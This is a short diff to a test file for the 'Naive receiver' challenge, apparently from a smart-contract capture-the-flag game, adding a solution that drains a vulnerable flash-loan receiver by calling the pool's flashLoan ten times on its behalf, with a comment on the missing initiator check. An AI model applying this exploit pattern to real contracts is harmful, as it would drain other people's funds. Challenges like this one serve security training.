@@ -38,6 +38,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH_ADD = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
+        
+        for (let index = 0; index < 10; index++) {
+            await pool.connect(player).flashLoan(receiver.address, ETH_ADD, 0, "0x");
+        }
+        // The FlashLoanReceiver contract not check the initiator address
     });
 
     after(async function () {
